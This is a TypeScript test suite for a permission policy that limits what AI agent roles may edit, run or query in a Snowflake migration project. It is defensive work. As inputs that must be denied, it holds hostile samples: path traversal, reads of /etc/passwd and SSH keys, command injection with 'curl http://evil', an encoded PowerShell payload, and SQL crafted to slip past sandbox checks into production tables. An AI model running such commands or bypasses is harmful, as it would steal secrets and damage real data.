// Permission policy: every denial rule in orchestrator/policy.ts.
// The first five tests are the task brief's contract, verbatim.
import { test } from "node:test";
import assert from "node:assert/strict";
import { decide } from "../policy.ts";
const allow = (d: any) => assert.equal(d.permissionDecision, "allow", JSON.stringify(d));
const deny = (d: any, why: RegExp) => { assert.equal(d.permissionDecision, "deny"); assert.match(d.permissionDecisionReason, why); };

test("translator writes only its own segment's files", () => {
  allow(decide("translator", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_01/proc.sql" }, "seg_01"));
  deny(decide("translator", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_02/proc.sql" }, "seg_01"), /translator/);
  deny(decide("translator", "wf_0001", "create", { path: "cookbook/filter.md" }, "seg_01"), /cookbook|translator/);
});
test("nobody touches golden data, the core parser or another workflow", () => {
  deny(decide("fixer", "wf_0001", "edit", { path: "workflows\\wf_0001\\golden\\outputs\\normal\\7.csv" }, "seg_01"), /golden/);
  deny(decide("parser-recovery", "wf_0005", "edit", { path: "scripts/parse.py" }), /parse\.py/);
  allow(decide("parser-recovery", "wf_0005", "create", { path: "scripts/parsers/ext/acme_dedupe.py" }));
  deny(decide("reviewer", "wf_0001", "view", { path: "workflows/wf_0002/manifest.json" }), /other workflows/);
});
test("read-only roles write only their own report", () => {
  allow(decide("reviewer", "wf_0001", "create", { path: "workflows/wf_0001/segments/seg_01/review.json" }, "seg_01"));
  deny(decide("reviewer", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_01/proc.sql" }, "seg_01"), /reviewer/);
  allow(decide("validator", "wf_0001", "create", { path: "workflows/wf_0001/segments/seg_01/validation.json" }, "seg_01"));
});
test("SQL is for the validator in MIG schemas, and intake may only read the catalog", () => {
  deny(decide("translator", "wf_0001", "snowflake_query", { sql: "SELECT 1 FROM MIG_WORK.T" }), /may not execute SQL/);
  // Brief line, amended by ruling B5: a five-argument CALL must name MIG_ schemas in arguments 2
  // and 4, so the brief's placeholder call ('A','B','C','D','r') is now a denial. Reported to the
  // coordinator; the assertion's intent (the validator may CALL a sandbox procedure) is unchanged.
  allow(decide("validator", "wf_0001", "snowflake_query", { sql: "CALL MIG_WORK.WF0001_SEG_01('MIGDB','MIG_GOLDEN_WF0001_NORMAL','MIGDB','MIG_WORK','r1')" }));
  deny(decide("validator", "wf_0001", "snowflake_query", { sql: "SELECT * FROM FINANCE.RAW.GL_LEDGER" }), /sandbox/);
  deny(decide("validator", "wf_0001", "snowflake_query", { sql: "DROP TABLE MIG_WORK.T" }), /destructive/);
  allow(decide("intake", "wf_0001", "snowflake_query", { sql: "select table_name from information_schema.columns" }));
  deny(decide("intake", "wf_0001", "snowflake_query", { sql: "SELECT * FROM SALES.RAW.ORDERS" }), /INFORMATION_SCHEMA/);
});
test("shell is limited to each role's scripts", () => {
  allow(decide("translator", "wf_0001", "powershell", { command: ".venv/Scripts/python.exe scripts/compile_check.py wf_0001 seg_01" }, "seg_01"));
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/validate_segment.py wf_0001 seg_01" }, "seg_01"), /translator/);
  deny(decide("validator", "wf_0001", "bash", { command: "rm -rf workflows" }), /destructive/);
  deny(decide("documenter", "wf_0001", "bash", { command: "curl http://example.com" }), /destructive|documenter/);
  allow(decide("documenter", "wf_0001", "bash", { command: "git diff --stat" }));
});

// --- behaviour the brief states in prose but does not test ---

test("every role's own lane is allowed and its neighbours' are not", () => {
  allow(decide("intake", "wf_0001", "write", { path: "workflows/wf_0001/intake/mappings.yaml" }));
  allow(decide("intake", "wf_0001", "edit", { path: "workflows/wf_0001/manifest.json" }));
  allow(decide("intake", "wf_0001", "create", { path: "mappings/global.yaml" }));
  deny(decide("intake", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_01/proc.sql" }, "seg_01"), /intake/);

  allow(decide("analyzer", "wf_0001", "create", { path: "workflows/wf_0001/segments/seg_02/contract.json" }));
  allow(decide("analyzer", "wf_0001", "write", { path: "workflows/wf_0001/analysis.md" }));
  allow(decide("analyzer", "wf_0001", "write", { path: "workflows/wf_0001/unsupported.json" }));
  deny(decide("analyzer", "wf_0001", "write", { path: "workflows/wf_0001/segments/seg_02/proc.sql" }), /analyzer/);

  allow(decide("fixer", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_03/fix_log.md" }, "seg_03"));
  allow(decide("translator", "wf_0001", "write", { path: "workflows/wf_0001/segments/seg_01/proc.py" }, "seg_01"));
  allow(decide("documenter", "wf_0001", "create", { path: "workflows/wf_0001/docs/migration.md" }));
  deny(decide("documenter", "wf_0001", "create", { path: "workflows/wf_0001/analysis.md" }), /documenter/);

  allow(decide("parser-recovery", "wf_0005", "create", { path: "tests/parser_corpus/vendor/fragment.xml" }));
  allow(decide("parser-recovery", "wf_0005", "write", { path: "workflows/wf_0005/parsed/parse_diagnosis.md" }));
  deny(decide("parser-recovery", "wf_0005", "write", { path: ".github/agents/translator.agent.md" }), /\.github/);
});
test("a write by a segment role without segment context is refused", () => {
  deny(decide("translator", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_01/proc.sql" }), /translator/);
});
test("shell rules cover every role's scripts and the shared read-only commands", () => {
  allow(decide("intake", "wf_0001", "bash", { command: "python scripts/intake_touchpoints.py wf_0001" }));
  allow(decide("intake", "wf_0001", "bash", { command: "python scripts/intake_prompt.py wf_0001" }));
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/compare.py --expected a --actual b" }));
  allow(decide("parser-recovery", "wf_0005", "bash", { command: "python -m pytest tests/parser_corpus -q" }));
  allow(decide("parser-recovery", "wf_0005", "bash", { command: "python scripts/parse.py wf_0005 --check" }));
  allow(decide("analyzer", "wf_0001", "bash", { command: "python scripts/segment.py wf_0001" }));
  deny(decide("reviewer", "wf_0001", "bash", { command: "python scripts/segment.py wf_0001" }), /reviewer/);
  allow(decide("reviewer", "wf_0001", "bash", { command: "cat workflows/wf_0001/segments/seg_01/proc.sql" }, "seg_01"));
  allow(decide("fixer", "wf_0001", "pwsh", { command: "Get-ChildItem workflows/wf_0001" }, "seg_01"));
  deny(decide("analyzer", "wf_0001", "bash", { command: "git push origin HEAD" }), /destructive/);
  deny(decide("fixer", "wf_0001", "bash", { command: "git reset --hard" }, "seg_01"), /destructive/);
  deny(decide("intake", "wf_0001", "powershell", { command: "Invoke-WebRequest https://example.com" }), /destructive/);
  deny(decide("analyzer", "wf_0001", "cmd", { command: "del /s workflows" }), /destructive/);
});
test("reading another workflow is denied whatever the tool is called", () => {
  deny(decide("translator", "wf_0001", "bash", { command: "cat workflows/wf_0002/manifest.json" }, "seg_01"), /other workflows/);
  deny(decide("validator", "wf_0001", "snowflake_query", { sql: "SELECT 1 FROM MIG_WORK.T -- see workflows/wf_0009/notes" }), /other workflows/);
  allow(decide("translator", "wf_0001", "view", { path: "workflows/wf_0001/segments/seg_01/contract.json" }, "seg_01"));
});
test("SQL denials apply to every SQL-shaped tool name and statement key", () => {
  deny(decide("documenter", "wf_0001", "run_sql", { query: "SELECT 1" }), /may not execute SQL/);
  deny(decide("validator", "wf_0001", "snowflake", { statement: "GRANT ROLE MIG_WORK.R TO USER X" }), /destructive/);
  deny(decide("intake", "wf_0001", "snowflake_query", { sql: "CALL INFORMATION_SCHEMA.DO_IT()" }), /INFORMATION_SCHEMA|read/);
  allow(decide("intake", "wf_0001", "snowflake_query", { sql: "SHOW TABLES IN INFORMATION_SCHEMA" }));
});
test("unmatched tools fall through to the read allow-list, not to allow", () => {
  allow(decide("analyzer", "wf_0001", "view", { path: "cookbook/index.md" }));
  allow(decide("documenter", "wf_0001", "think", { thought: "planning the runbook section" }));
});

// --- fix round 1: the reviewer's bypasses, each one reproduced before it was closed ---

const ROOT = "C:/Users/someone/Desktop/Alteryx to Snowflake";

test("CRITICAL 1: directory traversal cannot reach a forbidden area from any lane", () => {
  deny(decide("intake", "wf_0001", "edit", { path: "workflows/wf_0001/intake/../../../.github/agents/evil.md" }), /\.github/);
  deny(decide("intake", "wf_0001", "edit", { path: "mappings/../.github/agents/evil2.md" }), /\.github/);
  deny(decide("documenter", "wf_0001", "edit", { path: "workflows/wf_0001/docs/../../../.github/agents/evil3.md" }), /\.github/);
  deny(decide("parser-recovery", "wf_0005", "create", { path: "scripts/parsers/ext/../../../.github/agents/evil4.md" }), /\.github/);
  deny(decide("parser-recovery", "wf_0005", "create", { path: "tests/parser_corpus/../../../.github/agents/evil5.md" }), /\.github|escapes/);
  deny(decide("intake", "wf_0001", "edit", { path: "workflows/wf_0001/intake/../../../cookbook/hacked.md" }), /cookbook/);
});

test("CRITICAL 1: separators, case and absolute paths are normalized before any rule", () => {
  deny(decide("intake", "wf_0001", "edit", { path: "workflows\\wf_0001\\intake\\..\\..\\..\\.github\\agents\\evil.md" }), /\.github/);
  deny(decide("intake", "wf_0001", "edit", { path: "workflows/wf_0001/intake\\../..\\../.github/agents/evil.md" }), /\.github/);
  deny(decide("documenter", "wf_0001", "create", { path: "workflows/wf_0001/docs/../../../.GitHub/Agents/x.md" }), /\.github/);
  deny(decide("translator", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_01/../seg_02/proc.sql" }, "seg_01"), /translator/);
  deny(decide("analyzer", "wf_0001", "create", { path: "workflows/wf_0001/segments/../contract.json" }), /analyzer/);
  deny(decide("intake", "wf_0001", "edit", { path: "../outside/evil.md" }), /escapes|outside/);

  // absolute paths: inside the root they become root-relative, outside they are refused
  allow(decide("intake", "wf_0001", "edit", { path: `${ROOT}/workflows/wf_0001/intake/mappings.yaml` }, undefined, ROOT));
  deny(decide("intake", "wf_0001", "edit", { path: "C:/Windows/System32/drivers/etc/hosts" }, undefined, ROOT), /outside the repository/);
  deny(decide("intake", "wf_0001", "edit", { path: "//fileserver/share/evil.md" }, undefined, ROOT), /outside the repository/);
  deny(decide("intake", "wf_0001", "edit", { path: "/etc/passwd" }, undefined, ROOT), /outside the repository/);
  deny(decide("intake", "wf_0001", "edit", { path: `${ROOT}/.github/agents/evil.md` }, undefined, ROOT), /\.github/);
  deny(decide("intake", "wf_0001", "edit", { path: "C:/anywhere/mappings/global.yaml" }), /outside the repository/);
});

test("CRITICAL 1: every path-like argument is judged, and a write with none is refused", () => {
  deny(decide("translator", "wf_0001", "str_replace", { file_path: "cookbook/filter.md" }, "seg_01"), /cookbook/);
  deny(decide("documenter", "wf_0001", "write", { filePath: ".github/workflows/ci.yml" }), /\.github/);
  deny(decide("parser-recovery", "wf_0005", "create", { target: "scripts/parse.py" }), /parse\.py/);
  deny(decide("intake", "wf_0001", "apply_patch", { edits: [{ path: "workflows/wf_0001/intake/plan.md" }, { path: ".github/agents/evil.md" }] }), /\.github/);
  deny(decide("intake", "wf_0001", "edit", { old_path: "workflows/wf_0001/intake/plan.md", new_path: "orchestrator/policy.ts" }), /orchestrator/);
  deny(decide("translator", "wf_0001", "edit", { content: "SELECT 1" }, "seg_01"), /no path|cannot judge/i);
});

test("CRITICAL 1: the repo's own machinery is off limits to every role", () => {
  for (const target of [
    ".git/config",
    "node_modules/@github/copilot-sdk/dist/index.js",
    ".venv/Scripts/python.exe",
    "orchestrator/policy.ts",
    "orchestrate.ts",
    "orchestrator.config.json",
    "config.json",
    "docs/spec/01-copilot-setup.md",
    "samples/wf_0001/canned/analysis.md",
    "scripts/segment.py",
    "cookbook/proposals/2026-09-18-filter.md",
    "workflows/wf_0001/golden/inputs/normal/1.csv",
  ]) {
    deny(decide("intake", "wf_0001", "edit", { path: target }), /read-only|never|may not write|core parser|golden|outside/i);
  }
});

test("CRITICAL 2: validator SQL cannot reach production through comments, literals or extra statements", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  deny(sql("UPDATE FINANCE.RAW.GL_LEDGER SET AMOUNT=0 WHERE 1=1 -- MIG_WORK"), /sandbox/);
  deny(sql("DELETE FROM FINANCE.RAW.GL_LEDGER WHERE NOTE='ref MIG_WORK cleanup'"), /sandbox/);
  deny(sql("SELECT 1 FROM MIG_WORK.T; MERGE INTO FINANCE.RAW.GL_LEDGER USING MIG_WORK.T ON 1=1 WHEN MATCHED THEN UPDATE SET X=1"), /multiple statements/);
  deny(sql("COPY INTO FINANCE.RAW.GL_LEDGER FROM @MIG_WORK.STAGE"), /sandbox/);
  deny(sql("CALL FINANCE.RAW.DANGEROUS_PROC('x') /* MIG_WORK */"), /sandbox/);
  deny(sql("CREATE OR REPLACE TABLE FINANCE.RAW.GL_LEDGER AS SELECT * FROM MIG_WORK.T"), /sandbox/);
  deny(decide("intake", "wf_0001", "snowflake_query", { sql: "SELECT * FROM SALES.RAW.ORDERS -- information_schema" }), /INFORMATION_SCHEMA|catalog/i);
});

test("CRITICAL 2: unqualified and stage-shaped targets are refused, sandbox ones are not", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  deny(sql("INSERT INTO GL_LEDGER SELECT * FROM MIG_WORK.T"), /unqualified target/);
  deny(sql("CREATE OR REPLACE TABLE GL_LEDGER AS SELECT 1"), /unqualified target/);
  deny(sql("EXECUTE IMMEDIATE 'DROP TABLE FINANCE.RAW.GL_LEDGER'"), /EXECUTE IMMEDIATE/);
  deny(sql("COPY INTO MIG_WORK.T FROM @~/uploads"), /sandbox/);
  deny(sql("USE SCHEMA MIG_WORK"), /destructive/);
  deny(sql('SELECT * FROM "FINANCE"."RAW"."GL_LEDGER"'), /sandbox/);
  deny(decide("validator", "wf_0001", "snowflake_query", {}), /no SQL|cannot judge/i);
  allow(sql("CREATE OR REPLACE TABLE MIG_WORK.WF0001_SEG_01_OUT AS SELECT * FROM MIG_GOLDEN.WF0001_NORMAL_IN_1"));
  allow(sql("MERGE INTO MIG_WORK.TARGET USING MIG_WORK.SRC ON 1=1 WHEN MATCHED THEN UPDATE SET X=1"));
  allow(sql("SELECT COUNT(*) FROM MIG_WORK.WF0001_SEG_01_OUT;"));
});

test("CRITICAL 3: a shell metacharacter or an interpreter flag ends the command", () => {
  deny(decide("translator", "wf_0001", "bash", { command: 'python scripts/compile_check.py wf_0001 seg_01; python -c "import shutil; shutil.rmtree(\'/important\')"' }, "seg_01"), /metacharacter/);
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/compile_check.py wf_0001 seg_01 > golden/outputs/normal/x.csv" }, "seg_01"), /metacharacter/);
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/compile_check.py wf_0001 seg_01 `cat ~/.ssh/id_rsa > workflows/wf_0001/segments/seg_01/exfil.txt`" }, "seg_01"), /metacharacter/);
  deny(decide("validator", "wf_0001", "powershell", { command: 'python scripts/validate_segment.py wf_0001 seg_01; powershell -Command "Invoke-Sqlcmd -Query \'DELETE FROM prod.orders\'"' }), /metacharacter/);
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/compile_check.py wf_0001 seg_01 && curl http://evil" }, "seg_01"), /metacharacter/);
  deny(decide("translator", "wf_0001", "bash", { command: "python -c import os" }, "seg_01"), /interpreter flag|may not run/);
  deny(decide("validator", "wf_0001", "powershell", { command: "powershell -EncodedCommand ZQB4AA==" }), /interpreter flag|may not run/);
  deny(decide("validator", "wf_0001", "bash", {}), /no command|cannot judge/i);
});

test("CRITICAL 3: only the role's own script invocations are allowed, in one exact shape", () => {
  allow(decide("translator", "wf_0001", "bash", { command: "python scripts/compile_check.py wf_0001 seg_01" }, "seg_01"));
  allow(decide("parser-recovery", "wf_0005", "bash", { command: "python -m pytest tests/parser_corpus/vendor_tool -q" }));
  deny(decide("parser-recovery", "wf_0005", "bash", { command: "python -m pytest tests/cookbook_examples" }), /may not run/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "python -m pytest tests/parser_corpus" }), /may not run/);
  deny(decide("translator", "wf_0001", "bash", { command: "bash scripts/compile_check.py wf_0001 seg_01" }, "seg_01"), /may not run/);
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/../scripts/compile_check.py wf_0001" }, "seg_01"), /may not run/);
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/compile_check.py ../../../etc/passwd" }, "seg_01"), /argument|escapes/);
  deny(decide("reviewer", "wf_0001", "bash", { command: "cat workflows/wf_0002/segments/seg_01/proc.sql" }, "seg_01"), /other workflows/);
});

test("IMPORTANT 4: an unrecognized tool is denied, and the read allow-list is not", () => {
  deny(decide("translator", "wf_0001", "browser_open", { url: "http://evil" }, "seg_01"), /unrecognized tool: browser_open/);
  deny(decide("documenter", "wf_0001", "run_process", { argv: ["curl"] }), /unrecognized tool/);
  deny(decide("validator", "wf_0001", "mcp__anything__do", {}), /unrecognized tool/);
  for (const tool of ["view", "read", "read_file", "grep", "glob", "ls", "list_directory", "search", "search_files", "find", "report_intent", "think", "todo", "update_todo", "ask_user", "task", "fetch_copilot_cli_documentation"]) {
    allow(decide("analyzer", "wf_0001", tool, { path: "workflows/wf_0001/parsed/dag.json" }));
    deny(decide("analyzer", "wf_0001", tool, { path: "workflows/wf_0002/parsed/dag.json" }), /other workflows/);
  }
});

test("IMPORTANT 5: lane components are real ids, and lane files are exact", () => {
  deny(decide("reviewer", "wf_0001", "create", { path: "workflows/wf_0001/segments/seg_01/review.json.bak" }, "seg_01"), /reviewer/);
  deny(decide("reviewer", "wf_0001", "create", { path: "workflows/wf_0001/segments/seg_01/xreview.json" }, "seg_01"), /reviewer/);
  deny(decide("analyzer", "wf_0001", "create", { path: "workflows/wf_0001/segments/./contract.json" }), /analyzer/);
  deny(decide("validator", "wf_0001", "create", { path: "workflows/wf_0001/segments/seg_01/validation.json/../../../../evil.json" }, "seg_01"), /validator|escapes/);
  allow(decide("validator", "wf_0001", "create", { path: "workflows/wf_0001/segments/seg_01/validation_normal.json" }, "seg_01"));
});

// --- ruling B final: the schema check applies in object position; elsewhere a qualified name is
// a column reference and must be explained by an alias, a CTE, a declared table or a sandbox schema.

const VALIDATOR_PROCEDURE = `CREATE OR REPLACE PROCEDURE MIG_WORK.WF0003_SEG_02(SRC_DB STRING, SRC_SCHEMA STRING, TGT_DB STRING, TGT_SCHEMA STRING, RUN_ID STRING)
RETURNS STRING
LANGUAGE SQL
EXECUTE AS CALLER
AS
$$
BEGIN
  ALTER SESSION SET TIMEZONE = 'UTC';
  -- contract C4: each mapped table's name is built once, then referenced as IDENTIFIER(:<name>)
  LET GL_LEDGER_SRC VARCHAR := SRC_DB || '.' || SRC_SCHEMA || '.GL_LEDGER';
  LET GL_SUMMARY_TGT VARCHAR := TGT_DB || '.' || TGT_SCHEMA || '.GL_SUMMARY';
  CREATE OR REPLACE TABLE MIG_WORK.WF0003_SEG_02_OUT AS
  WITH t12_input AS (
    -- tool 12: Input Data
    SELECT ACCT, PERIOD, AMOUNT, POSTED_AT FROM IDENTIFIER(:GL_LEDGER_SRC)
  ),
  t20_join AS (
    -- tool 20: Join
    SELECT l.ACCT, l.PERIOD, l.AMOUNT, r.REGION
    FROM t12_input l
    JOIN MIG_WORK.WF0003_SEG_01_OUT r ON l.ACCT = r.ACCT
  )
  SELECT ACCT, PERIOD, SUM(AMOUNT) AS AMOUNT, REGION
  FROM t20_join
  GROUP BY ACCT, PERIOD, REGION
  QUALIFY ROW_NUMBER() OVER (PARTITION BY ACCT ORDER BY PERIOD) = 1;
  MERGE INTO IDENTIFIER(:GL_SUMMARY_TGT) t
  USING MIG_WORK.WF0003_SEG_02_OUT s ON t.ACCT = s.ACCT
  WHEN MATCHED THEN UPDATE SET t.AMOUNT = s.AMOUNT
  WHEN NOT MATCHED THEN INSERT (ACCT, AMOUNT) VALUES (s.ACCT, s.AMOUNT);
  RETURN 'OK';
END;
$$;`;

test("ruling B: a qualified column is a column, not an object", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  allow(sql("SELECT a.ACCT FROM MIG_WORK.T a"));
  allow(sql("SELECT MIG_WORK.T.ACCT FROM MIG_WORK.T"));
  allow(sql("SELECT l.ACCT, r.AMOUNT FROM MIG_WORK.L l JOIN MIG_WORK.R r ON l.ACCT = r.ACCT"));
  allow(sql("SELECT ACCT, AMOUNT FROM MIG_WORK.WF0001_SEG_01_OUT"));
  allow(sql("SELECT COUNT(*) FROM MIG_WORK.WF0001_SEG_01_OUT"));
  deny(sql("SELECT FINANCE.RAW.GL.AMOUNT FROM MIG_WORK.T"), /unexplained qualified reference/);
});

test("ruling B: object position covers joins, commas, clones, stages and qualified calls", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  deny(sql("SELECT * FROM MIG_WORK.T a, FINANCE.RAW.GL b"), /comma join/);
  deny(sql("SELECT FINANCE.RAW.FN(1) FROM MIG_WORK.T"), /sandbox/);
  deny(sql("CREATE TABLE MIG_WORK.X CLONE FINANCE.RAW.GL"), /sandbox/);
  deny(sql("SELECT * FROM MIG_WORK.T JOIN FINANCE.RAW.GL g ON 1=1"), /sandbox/);
  deny(sql("ALTER TABLE MIG_WORK.X SWAP WITH FINANCE.RAW.GL"), /sandbox|unexplained/);
  deny(sql("COPY INTO MIG_WORK.T FROM @FINANCE.RAW_STAGE"), /sandbox/);
  allow(sql("WITH src AS (SELECT * FROM MIG_WORK.T) SELECT * FROM src"));
  deny(sql("WITH src AS (SELECT * FROM MIG_WORK.T) SELECT * FROM other_cte"), /unqualified target/);
});

test("ruling B: a name the policy cannot resolve is refused", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  deny(sql("SELECT * FROM IDENTIFIER('FINANCE.RAW.GL')"), /dynamic object name/);
  deny(sql("EXECUTE IMMEDIATE 'select 1'"), /EXECUTE IMMEDIATE/);
  deny(sql("SELECT * FROM TABLE(FLATTEN(input => 1))"), /TABLE\(|sandbox/);
  allow(sql("SELECT * FROM TABLE(MIG_WORK.MY_TABLE_FN(1))"));
});

test("ruling B4: a procedure body is checked statement by statement", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  allow(sql(VALIDATOR_PROCEDURE));
  deny(
    sql(VALIDATOR_PROCEDURE.replace("JOIN MIG_WORK.WF0003_SEG_01_OUT r", "JOIN FINANCE.RAW.REGIONS r")),
    /sandbox/,
  );
  deny(
    sql(`CREATE OR REPLACE PROCEDURE MIG_WORK.P(RUN_ID STRING)
RETURNS STRING LANGUAGE SQL EXECUTE AS CALLER AS
$$
BEGIN
  DELETE FROM FINANCE.RAW.GL;
  RETURN 'OK';
END;
$$`),
    /sandbox/,
  );
  deny(
    sql(`CREATE OR REPLACE PROCEDURE MIG_WORK.P(RUN_ID STRING)
RETURNS STRING LANGUAGE SQL EXECUTE AS CALLER AS
$$
BEGIN
  CREATE OR REPLACE TABLE MIG_WORK.X AS SELECT * FROM IDENTIFIER('FINANCE.RAW.GL');
  RETURN 'OK';
END;
$$`),
    /dynamic object name/,
  );
  deny(
    sql(`CREATE OR REPLACE PROCEDURE ANALYTICS.CURATED.P(RUN_ID STRING)
RETURNS STRING LANGUAGE SQL EXECUTE AS CALLER AS
$$
BEGIN
  RETURN 'OK';
END;
$$`),
    /MIG_WORK/,
  );
});

// --- Task C4V: contract C4's documented table reference. Snowflake documents
// IDENTIFIER( { string_literal | session_variable | bind_variable | snowflake_scripting_variable } ):
// one value, not an expression. A procedure builds each mapped table's name with
// `LET <LOGICAL>_SRC VARCHAR := SRC_DB || '.' || SRC_SCHEMA || '.<LOGICAL>'` (or the TGT twin) and
// references it as IDENTIFIER(:<LOGICAL>_SRC). Nothing here has run on Snowflake; the first
// real-account run confirms the documented form.

const procedureOf = (...statements: string[]) => `CREATE OR REPLACE PROCEDURE MIG_WORK.WF0003_SEG_02(SRC_DB STRING, SRC_SCHEMA STRING, TGT_DB STRING, TGT_SCHEMA STRING, RUN_ID STRING)
RETURNS STRING LANGUAGE SQL EXECUTE AS CALLER AS
$$
BEGIN
${statements.map((statement) => `  ${statement};`).join("\n")}
  RETURN 'OK';
END;
$$;`;
const LET_SOURCE = "LET GL_LEDGER_SRC VARCHAR := SRC_DB || '.' || SRC_SCHEMA || '.GL_LEDGER'";
const LET_TARGET = "LET GL_SUMMARY_TGT VARCHAR := TGT_DB || '.' || TGT_SCHEMA || '.GL_SUMMARY'";
const READ_SOURCE = "CREATE OR REPLACE TABLE MIG_WORK.WF0003_SEG_02_OUT AS SELECT ACCT FROM IDENTIFIER(:GL_LEDGER_SRC)";
const WRITE_TARGET = "INSERT INTO IDENTIFIER(:GL_SUMMARY_TGT) SELECT ACCT FROM MIG_WORK.WF0003_SEG_02_OUT";
/** The expression form every procedure used before Task C4V: not in Snowflake's documented grammar. */
const OLD_SOURCE = "IDENTIFIER(:SRC_DB || '.' || :SRC_SCHEMA || '.GL_LEDGER')";
const OLD_TARGET = "IDENTIFIER(:TGT_DB || '.' || :TGT_SCHEMA || '.GL_SUMMARY')";

test("C4V: IDENTIFIER(:<VAR>) is a contract name only when a matching LET earlier in the same body declares it", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  allow(sql(procedureOf(LET_SOURCE, LET_TARGET, READ_SOURCE, WRITE_TARGET)));
  allow(sql(procedureOf(LET_SOURCE, READ_SOURCE.replace(":GL_LEDGER_SRC", ":gl_ledger_src"))));
  deny(sql(procedureOf(READ_SOURCE, LET_SOURCE)), /dynamic object name/); // used before its LET
  deny(sql(procedureOf(LET_TARGET, READ_SOURCE)), /dynamic object name/); // never declared
  deny(sql(procedureOf(LET_SOURCE, READ_SOURCE.replace(":GL_LEDGER_SRC", ":SRC_DB"))), /dynamic object name/);
  deny(sql("SELECT ACCT FROM IDENTIFIER(:GL_LEDGER_SRC)"), /dynamic object name/); // no body declares it
  deny(sql(procedureOf(LET_SOURCE, LET_SOURCE, READ_SOURCE)), /twice/);
});

test("C4V: the expression form inside IDENTIFIER( is denied like any other dynamic name", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  const wholeOldForm = VALIDATOR_PROCEDURE.replace(/ {2}-- contract C4:.*\n {2}LET .*\n {2}LET .*\n/, "")
    .replace("IDENTIFIER(:GL_LEDGER_SRC)", OLD_SOURCE)
    .replace("IDENTIFIER(:GL_SUMMARY_TGT)", OLD_TARGET);
  assert.ok(!wholeOldForm.includes("LET "));
  deny(sql(wholeOldForm), /dynamic object name/);
  deny(sql(VALIDATOR_PROCEDURE.replace("IDENTIFIER(:GL_LEDGER_SRC)", OLD_SOURCE)), /dynamic object name/);
  deny(sql(VALIDATOR_PROCEDURE.replace("IDENTIFIER(:GL_SUMMARY_TGT)", OLD_TARGET)), /dynamic object name/);
});

test("C4V: a LET must build a contract-C4 name, by the rule's own naming", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  for (const let_ of [
    "LET GL_LEDGER_SRC VARCHAR := 'FINANCE.RAW.GL_LEDGER'",
    "LET GL_LEDGER_SRC VARCHAR := SRC_DB || '.' || TGT_SCHEMA || '.GL_LEDGER'",
    "LET GL_LEDGER_SRC VARCHAR := 'FINANCE' || '.' || SRC_SCHEMA || '.GL_LEDGER'",
    "LET GL_LEDGER_SRC VARCHAR := SRC_DB || '.' || SRC_SCHEMA || '.GL_LEDGER' || ''",
    "LET GL_LEDGER_TGT VARCHAR := SRC_DB || '.' || SRC_SCHEMA || '.GL_LEDGER'",
    "LET OTHER_SRC VARCHAR := SRC_DB || '.' || SRC_SCHEMA || '.GL_LEDGER'",
    "LET GL_LEDGER_SRC := SRC_DB || '.' || SRC_SCHEMA || '.GL_LEDGER'",
    "LET GL_LEDGER_SRC VARCHAR := src_db || '.' || src_schema || '.GL_LEDGER'",
    "LET X NUMBER := 1",
  ]) {
    deny(sql(procedureOf(let_, READ_SOURCE)), /LET/);
  }
});

test("C4V fix round 1: a LET names the procedure's arguments without a colon", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  allow(sql(procedureOf(LET_SOURCE, READ_SOURCE)));
  deny(sql(procedureOf("LET GL_LEDGER_SRC VARCHAR := :SRC_DB || '.' || :SRC_SCHEMA || '.GL_LEDGER'", READ_SOURCE)), /without a colon/);
  deny(sql(procedureOf("LET GL_LEDGER_SRC VARCHAR := SRC_DB || '.' || :SRC_SCHEMA || '.GL_LEDGER'", READ_SOURCE)), /without a colon/);
});

test("C4V: a LET variable cannot be re-bound after its LET", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  deny(sql(procedureOf(LET_SOURCE, "GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE)), /assign/);
  deny(sql(procedureOf(LET_SOURCE, "SELECT 'FINANCE.RAW.GL_LEDGER' INTO :GL_LEDGER_SRC", READ_SOURCE)), /INTO/);
  deny(
    sql(procedureOf(LET_SOURCE, READ_SOURCE).replace(
      "$$\nBEGIN\n",
      () => "$$\nDECLARE\n  GL_LEDGER_SRC VARCHAR DEFAULT 'FINANCE.RAW.GL_LEDGER';\nBEGIN\n",
    )),
    /DECLARE/,
  );
});

// --- Task C4V fix round 2: the judge trusts IDENTIFIER(:<VAR>) only because nothing in a body can
// re-point <VAR>. Contract C4 bodies are FLAT: rule-conforming LETs, SQL statements and one
// RETURN '<literal>'. Every shape below was ALLOWED by the fix-round-1 judge (the task review's
// bypass table); each lets a procedure CALLed with sandbox arguments read or write another table.

const LET_TARGET_ROW = "LET GL_SUMMARY_TGT VARCHAR := TGT_DB || '.' || TGT_SCHEMA || '.GL_SUMMARY'";
const OVERWRITE_TARGET = "CREATE OR REPLACE TABLE IDENTIFIER(:GL_SUMMARY_TGT) AS SELECT 1 AS X";
const C4_PARAMETERS = "(SRC_DB STRING, SRC_SCHEMA STRING, TGT_DB STRING, TGT_SCHEMA STRING, RUN_ID STRING)";

